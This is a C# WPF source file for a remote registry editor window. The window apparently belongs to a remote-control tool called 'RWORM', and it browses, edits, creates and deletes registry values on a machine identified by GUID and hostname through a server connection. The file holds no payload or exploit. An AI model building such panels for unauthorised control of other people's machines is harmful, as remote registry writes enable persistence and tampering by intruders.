using System;
using System.Collections.Generic;
using System.Linq;
using System.Text.Json;
using System.Windows;
using System.Windows.Controls;
using RWORM.GUI.Services;

namespace RWORM.GUI.Views
{
    public record RegValue(string Name, string Kind, string Value);

    public partial class RegistryEditorWindow : Window
    {
        private readonly ServerConnection _server;
        private readonly string           _guid;
        private string _currentPath = "HKCU";

        private static readonly string[] RootHives =
            { "HKCU", "HKLM", "HKCR", "HKU", "HKCC" };

        public RegistryEditorWindow(ServerConnection server, string guid, string hostname)
        {
            InitializeComponent();
            _server = server;
            _guid   = guid;
            TitleLabel.Text = $"Registry — {hostname}";
            PopulateRoots();
        }

        // ── Tree population ───────────────────────────────────────────────────
        private void PopulateRoots()
        {
            foreach (var hive in RootHives)
            {
                var item = new TreeViewItem { Header = hive, Tag = hive };
                item.Items.Add(new TreeViewItem { Header = "⏳" }); // lazy placeholder
                item.Expanded += LazyExpand;
                KeyTree.Items.Add(item);
            }
        }

        private void LazyExpand(object s, RoutedEventArgs e)
        {
            if (s is not TreeViewItem node) return;
            if (node.Items.Count == 1 && node.Items[0] is TreeViewItem t && t.Header?.ToString() == "⏳")
            {
                node.Items.Clear();
                var path = node.Tag?.ToString() ?? "";
                _server.RequestRegList(_guid, path, data => Dispatcher.Invoke(() => PopulateNode(node, path, data)));
            }
        }

        private void PopulateNode(TreeViewItem parent, string basePath, byte[] data)
        {
            try
            {
                using var doc = JsonDocument.Parse(data);
                var root = doc.RootElement;
                if (!root.TryGetProperty("ok", out var ok) || !ok.GetBoolean()) return;
                var d    = root.GetProperty("data");
                if (!d.TryGetProperty("subkeys", out var subs)) return;

                foreach (var sk in subs.EnumerateArray())
                {
                    var name    = sk.GetString() ?? "";
                    var subPath = basePath + "\\" + name;
                    var child   = new TreeViewItem { Header = name, Tag = subPath };
                    child.Items.Add(new TreeViewItem { Header = "⏳" });
                    child.Expanded += LazyExpand;
                    parent.Items.Add(child);
                }
            }
            catch { }
        }

        // ── Selection ─────────────────────────────────────────────────────────
        private void KeyTree_SelectedItemChanged(object s, RoutedPropertyChangedEventArgs<object> e)
        {
            if (KeyTree.SelectedItem is not TreeViewItem node) return;
            _currentPath = node.Tag?.ToString() ?? "";
            PathLabel.Text  = _currentPath;
            StatusLabel.Text = "Loading values...";
            _server.RequestRegList(_guid, _currentPath, data => Dispatcher.Invoke(() => ShowValues(data)));
        }

        private void ShowValues(byte[] data)
        {
            try
            {
                using var doc = JsonDocument.Parse(data);
                var root = doc.RootElement;
                if (!root.TryGetProperty("ok", out var ok) || !ok.GetBoolean()) { StatusLabel.Text = "Error"; return; }
                var d  = root.GetProperty("data");
                var vs = d.GetProperty("values").EnumerateArray()
                          .Select(v => new RegValue(
                              v.GetProperty("name").GetString() ?? "",
                              v.GetProperty("kind").GetString() ?? "",
                              v.GetProperty("value").GetString() ?? ""
                          )).ToList();
                ValuesGrid.ItemsSource = vs;
                StatusLabel.Text = $"{vs.Count} values";
            }
            catch (Exception ex) { StatusLabel.Text = ex.Message; }
        }

        // ── Toolbar ────────────────────────────────────────────────────────────
        private void Refresh_Click(object s, RoutedEventArgs e)
        {
            StatusLabel.Text = "Refreshing...";
            _server.RequestRegList(_guid, _currentPath,
                data => Dispatcher.Invoke(() => ShowValues(data)));
        }

        private void EditValue_Click(object s, RoutedEventArgs e)
        {
            if (ValuesGrid.SelectedItem is not RegValue v) return;
            var newVal = InputDialog.Show($"Edit value: {v.Name}\nType: {v.Kind}", "Edit Registry Value", v.Value);
            if (newVal == null) return;
            _ = _server.WriteRegValue(_guid, _currentPath, v.Name, v.Kind, newVal);
            StatusLabel.Text = $"Written: {v.Name}";
            Refresh_Click(s, e);
        }

        private void NewValue_Click(object s, RoutedEventArgs e)
        {
            var name = InputDialog.Show("Value name:", "New Value", "NewValue");
            if (string.IsNullOrWhiteSpace(name)) return;
            var kind = InputDialog.Show("Type (String/DWORD/QWORD/Binary/Expand_SZ/Multi_SZ):", "New Value Type", "String");
            if (string.IsNullOrWhiteSpace(kind)) return;
            var data = InputDialog.Show("Data:", "New Value Data", "");
            if (data == null) return;
            _ = _server.WriteRegValue(_guid, _currentPath, name, kind, data);
            Refresh_Click(s, e);
        }

        private void DeleteValue_Click(object s, RoutedEventArgs e)
        {
            if (ValuesGrid.SelectedItem is not RegValue v) return;
            if (MessageBox.Show($"Delete value '{v.Name}'?", "Confirm",
                    MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
            _ = _server.DeleteRegValue(_guid, _currentPath, v.Name);
            Refresh_Click(s, e);
        }
    }
}
